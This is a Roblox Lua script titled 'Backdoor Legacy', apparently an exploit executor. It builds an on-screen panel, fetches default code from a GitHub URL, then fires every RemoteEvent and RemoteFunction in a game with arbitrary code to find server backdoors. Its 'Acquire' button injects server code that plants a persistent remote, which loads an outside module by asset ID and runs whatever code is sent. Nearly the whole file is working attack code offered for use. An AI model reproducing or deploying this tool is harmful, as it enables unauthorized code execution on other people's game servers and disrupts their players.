-- Import from URL feature coming soon!

print("Backdoor Legacy // Successfully booted up!")
local function debug(msg)
	if 0 == 1 then 
	game:GetService('TestService'):Message('BackdoorLegacy // '..tostring(msg)) -- This is for debugging. 
	end 
end 

-- Create GUI Objects

local ScrnGui = Instance.new("ScreenGui")
local MnPrt = Instance.new("Frame")
local InPrt = Instance.new("Frame")
local Cody = Instance.new("TextBox")
local Execy = Instance.new("TextButton")
local Acqur = Instance.new("TextButton")
local Labely = Instance.new("TextLabel")

-- Set Properties

ScrnGui.Name = "BackdoorLegacy"
ScrnGui.Parent = game:GetService('CoreGui')
ScrnGui.ResetOnSpawn = false

MnPrt.Active = true
MnPrt.BackgroundColor3 = Color3.new(0,0,0)
MnPrt.BorderColor3 = Color3.new(1,0,0)
MnPrt.Name = "MainPart"
MnPrt.Parent = ScrnGui
MnPrt.Position = UDim2.new(.5,-180,.5,-120)
MnPrt.Size = UDim2.new(0,360,0,240)
MnPrt.Draggable = true

InPrt.Active = true
InPrt.BackgroundColor3 = Color3.new(0,0,0)
InPrt.BorderColor3 = Color3.new(1,0,0)
InPrt.Name = "Inside"
InPrt.Parent = MnPrt
InPrt.Position = UDim2.new(0,0,0,50)
InPrt.Size = UDim2.new(0,360,0,190)
InPrt.Draggable = false

Cody.Active = true
Cody.BackgroundColor3 = Color3.new(0,0,0)
Cody.BorderColor3 = Color3.new(1,0,0)
Cody.ClearTextOnFocus = false
Cody.MultiLine = true
Cody.Name = "Code"
Cody.Parent = InPrt
Cody.Position = UDim2.new(0,5,0,5)
Cody.Size = UDim2.new(0,350,0,140)
Cody.Font = Enum.Font.Legacy
Cody.FontSize = Enum.FontSize.Size8
Cody.Text = game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/checkerCode/main.lua')
Cody.TextColor3 = Color3.new(1,0,0)
Cody.TextWrapped = true
Cody.TextXAlignment = Enum.TextXAlignment.Left
Cody.TextYAlignment = Enum.TextYAlignment.Top

Execy.Active = true
Execy.BackgroundColor3 = Color3.new(0,0,0)
Execy.BorderColor3 = Color3.new(1,0,0)
Execy.Name = "Execute"
Execy.Parent = InPrt
Execy.Position = UDim2.new(0,5,0,150)
Execy.Size = UDim2.new(0,170,0,35)
Execy.Font = Enum.Font.Legacy
Execy.FontSize = Enum.FontSize.Size14
Execy.Text = 'Execute!'
Execy.TextColor3 = Color3.new(1,0,0)

Acqur.Active = true
Acqur.BackgroundColor3 = Color3.new(0,0,0)
Acqur.BorderColor3 = Color3.new(1,0,0)
Acqur.Name = "Acquire"
Acqur.Parent = InPrt
Acqur.Position = UDim2.new(0,185,0,150)
Acqur.Size = UDim2.new(0,170,0,35)
Acqur.Font = Enum.Font.Legacy
Acqur.FontSize = Enum.FontSize.Size14
Acqur.Text = 'Acquire!'
Acqur.TextColor3 = Color3.new(1,0,0)

Labely.Active = true
Labely.BackgroundColor3 = Color3.new(0,0,0)
Labely.BorderColor3 = Color3.new(1,0,0)
Labely.Name = "Title"
Labely.Parent = MnPrt
Labely.Position = UDim2.new(0,180,0,25)
Labely.Size = UDim2.new(0,0,0,0)
Labely.Font = Enum.Font.Legacy
Labely.FontSize = Enum.FontSize.Size14
Labely.Text = 'Backdoor Legacy'
Labely.TextColor3 = Color3.new(1,0,0)

-- Add functionalities!

local AcquiredRemote = nil 
local IsAcquiring = false 

Execy.MouseButton1Click:Connect(function()
	-- Fetch code from TextBox.
	local CodeStr = Cody.Text
	local InvokeFunc = Instance.new("BindableEvent")
	InvokeFunc.Event:Connect(function(rfunc,codestr2)
		-- This invokes the RemoteFunction without waiting.
		rfunc:InvokeServer(codestr2)
	end)
	local function DeepFire(inst)
		if not IsAcquiring then 
		if AcquiredRemote == nil then 
		-- Search every descendant of DataModel.
		for _, childy in inst:GetChildren() do
			-- We don't want remotes from RobloxReplicatedStorage!
			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
				-- Check the class of the descendant.
				if childy:IsA("RemoteEvent") then
					-- If it is a RemoteEvent, fire it with code!
					print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
					childy:FireServer(CodeStr)
				elseif childy:IsA("RemoteFunction") then
					-- Else if it is a RemoteFunction, invoke it with code!
					print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".')
					InvokeFunc:Fire(childy, CodeStr)
				end
			end
				-- Keep looping through descendants, until dead end.
			DeepFire(childy)
		end 
		else 
		if AcquiredRemote:IsA("RemoteEvent") then 
			AcquiredRemote:FireServer(CodeStr) 
		elseif AcquiredRemote:IsA("RemoteFunction") then 
			task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
		end
		end 
		end
	end
	-- Call the function!
	warn("Backdoor Legacy // Running all remotes with code:\n"..CodeStr)
	DeepFire(game)
end)

-- While making this acquire feature, my brain almost exploded.
-- Acquire feature version 2.0 ! Now works more efficient and faster!

Acqur.MouseButton1Click:Connect(function()if not isAcquiring then 
	local RequiredName = string.char(math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90),math.random(65,90))
	local AcquireCode = 'local a = Instance.new("RemoteEvent",game:GetService("Players"):WaitForChild("'..game:GetService('Players').LocalPlayer.Name..'"); a.Name = "'..RequiredName..'"; a.OnServerEvent:Connect(function(_,code)require(14132891321):SpawnS(code,workspace)end);' 
	Cody.Text = "-- Acquire Feature V2\n-- Acquiring, please wait..."
	for i,v in pairs(game:GetDescendants()) do if v.Parent ~= game:GetService("RobloxReplicatedStorage") then 
		if v:IsA("RemoteEvent") then 
			v:FireServer(AcquireCode) 
		elseif v:IsA("RemoteFunction") then 
			task.spawn(function()v:InvokeServer(AcquireCode)end) 
		end 
	end end 
	wait(10)
	if game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) then 
		local SelectedInstance = game:GetService("Players").LocalPlayer:FindFirstChild(RequiredName) 
		if SelectedInstance:IsA("RemoteEvent") then 
			AcquiredRemote = SelectedInstance 
			Cody.Text = "-- Acquire Feature V2\n-- Successfully acquired!" 
		else 
			Cody.Text = "-- Acquire Feature V2\n-- Failed to acquire a remote!" 
		end 
	else 
		Cody.Text = "-- Acquire Feature V2\n-- Failed to acquire a remote!" 
	end
end end)

-- That's the end of the code!
